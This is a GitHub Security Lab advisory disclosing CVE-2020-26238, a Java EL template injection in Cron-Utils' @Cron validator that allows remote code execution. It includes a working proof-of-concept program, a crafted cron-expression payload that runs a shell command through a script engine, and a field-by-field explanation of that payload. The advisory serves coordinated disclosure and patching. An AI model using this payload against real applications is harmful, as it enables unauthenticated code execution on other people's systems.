<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">December 3, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-212: Template injection in Cron-utils - CVE-2020-26238</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>A Template Injection was identified in Cron-Utils enabling attackers to inject arbitrary Java EL expressions, leading to unauthenticated Remote Code Execution (RCE) vulnerability.</p>

<h2 id="product">Product</h2>

<p>Cron-Utils</p>

<h2 id="tested-version">Tested Version</h2>

<p>latest commit to the date of testing: b080eba</p>

<h2 id="details">Details</h2>

<h3 id="remote-code-execution---javael-injection">Remote Code Execution - JavaEL Injection</h3>

<p>If developers use the <code class="language-plaintext highlighter-rouge">@Cron</code> annotation to validate a user controlled Cron expression, attackers will be able to inject and run arbitrary Java Expression Language (EL) expressions.</p>

<p>Cron-Utils uses Java Bean Validation (JSR 380) custom constraint validators such as <a href="https://github.com/jmrozanec/cron-utils/blob/master/src/main/java/com/cronutils/validation/CronValidator.java"><code class="language-plaintext highlighter-rouge">CronValidator</code></a>. When building custom constraint violation error messages, it is important to understand that they support different types of interpolation, including <a href="https://docs.jboss.org/hibernate/validator/5.1/reference/en-US/html/chapter-message-interpolation.html#section-interpolation-with-message-expressions">Java EL expressions</a>. Therefore if an attacker can inject arbitrary data in the error message template passed to <code class="language-plaintext highlighter-rouge">ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code>, they will be able to run arbitrary Java code. Unfortunately, it is common that validated (and therefore, normally untrusted) bean properties flow into the custom error message. In this case <code class="language-plaintext highlighter-rouge">CronValidator</code> includes the Cron expression being validated in the custom constraint error validation message if an exception is thrown while parsing the expression:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isValid</span><span class="o">(</span><span class="nc">String</span> <span class="n">value</span><span class="o">,</span> <span class="nc">ConstraintValidatorContext</span> <span class="n">context</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="nc">CronDefinition</span> <span class="n">cronDefinition</span> <span class="o">=</span> <span class="nc">CronDefinitionBuilder</span><span class="o">.</span><span class="na">instanceDefinitionFor</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
        <span class="nc">CronParser</span> <span class="n">cronParser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CronParser</span><span class="o">(</span><span class="n">cronDefinition</span><span class="o">);</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">cronParser</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">value</span><span class="o">).</span><span class="na">validate</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IllegalArgumentException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">context</span><span class="o">.</span><span class="na">disableDefaultConstraintViolation</span><span class="o">();</span>
            <span class="n">context</span><span class="o">.</span><span class="na">buildConstraintViolationWithTemplate</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">()).</span><span class="na">addConstraintViolation</span><span class="o">();</span>
            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="poc">PoC</h4>

<p>In order to reproduce this vulnerability you can use the following test code:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.cronutils.validation.Cron</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.cronutils.model.CronType</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Set</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.validation.ConstraintViolation</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.validation.Validation</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.validation.Validator</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.validation.ValidatorFactory</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">Job</span> <span class="o">{</span>
    <span class="nd">@Cron</span><span class="o">(</span><span class="n">type</span> <span class="o">=</span> <span class="nc">CronType</span><span class="o">.</span><span class="na">SPRING</span><span class="o">)</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">cronExpression</span><span class="o">;</span>

    <span class="nc">String</span> <span class="nf">getCronExpression</span><span class="o">()</span> <span class="o">{</span>
      <span class="k">return</span> <span class="n">cronExpression</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kt">void</span> <span class="nf">setCronExpression</span><span class="o">(</span><span class="nc">String</span> <span class="n">cronExpression</span><span class="o">)</span> <span class="o">{</span>
      <span class="k">this</span><span class="o">.</span><span class="na">cronExpression</span> <span class="o">=</span> <span class="n">cronExpression</span><span class="o">;</span>
    <span class="o">}</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Job</span> <span class="n">job</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Job</span><span class="o">();</span>
    <span class="n">job</span><span class="o">.</span><span class="na">setCronExpression</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec('touch /tmp/pwned'); // 4 5 [${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(validatedValue)}]"</span><span class="o">);</span>

    <span class="nc">ValidatorFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="nc">Validation</span><span class="o">.</span><span class="na">buildDefaultValidatorFactory</span><span class="o">();</span>
    <span class="nc">Validator</span> <span class="n">validator</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">getValidator</span><span class="o">();</span>

    <span class="nc">Set</span><span class="o">&lt;</span><span class="nc">ConstraintViolation</span><span class="o">&lt;</span><span class="nc">Job</span><span class="o">&gt;&gt;</span> <span class="n">constraintViolations</span> <span class="o">=</span> <span class="n">validator</span><span class="o">.</span><span class="na">validate</span><span class="o">(</span><span class="n">job</span><span class="o">);</span>
    <span class="nc">String</span> <span class="n">errmsg</span> <span class="o">=</span> <span class="n">constraintViolations</span><span class="o">.</span><span class="na">iterator</span><span class="o">().</span><span class="na">next</span><span class="o">().</span><span class="na">getMessage</span><span class="o">();</span>
    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">errmsg</span><span class="o">);</span>
  <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>If the cron-utils’ <code class="language-plaintext highlighter-rouge">@Cron</code> annotation is used to validate an user controlled expression, it will allow an attacker to execute arbitrary Java code.</p>

<p>In order to trigger an exception and keep the payload lower case and allow whitespaces, we need to use a payload in the form of:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="err">'</span><span class="n">touch</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">pwned</span><span class="err">'</span><span class="o">);</span> <span class="c1">// 4 5 [${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(validatedValue)}]");</span>
</code></pre></div></div>

<p>Where the cron fields are:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">java.lang.Runtime.getRuntime().exec('touch</code></li>
  <li><code class="language-plaintext highlighter-rouge">/tmp/pwned');</code></li>
  <li><code class="language-plaintext highlighter-rouge">//</code></li>
  <li><code class="language-plaintext highlighter-rouge">4</code></li>
  <li><code class="language-plaintext highlighter-rouge">5</code></li>
  <li><code class="language-plaintext highlighter-rouge">[${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(validatedValue)}]");</code></li>
</ol>

<p>Which will result in an exception such as:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Failed to parse 'java.lang.Runtime.getRuntime().exec('touch /tmp/pwned'); // 4 5 [java.lang.UNIXProcess@28a53635]'. Invalid chars in expression! Expression: JAVA.LANG.RUNTIME.GETRUNTIME().EXEC('TOUCH Invalid chars: JAVA.LANG.RUNTIME.GETRUNTIME().EXEC('TOUCH
</code></pre></div></div>

<p>Note that the sixth component has been evaluated to <code class="language-plaintext highlighter-rouge">java.lang.UNIXProcess@28a53635</code> proving that the process ran.</p>

<h4 id="impact">Impact</h4>

<p>This issue leads to Remote Code execution</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2020-26238</li>
</ul>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>11/05/2020: Report sent to jmrozanec@gmail.com</li>
  <li>11/21/2020: Issue is fixed in version 9.1.3</li>
</ul>

<h2 id="resources">Resources</h2>

<ul>
  <li><a href="https://github.com/jmrozanec/cron-utils/security/advisories/GHSA-pfj3-56hm-jwq5">https://github.com/jmrozanec/cron-utils/security/advisories/GHSA-pfj3-56hm-jwq5</a></li>
  <li><a href="https://github.com/jmrozanec/cron-utils/issues/461">https://github.com/jmrozanec/cron-utils/issues/461</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-212</code> in any communication regarding this issue.</p>

 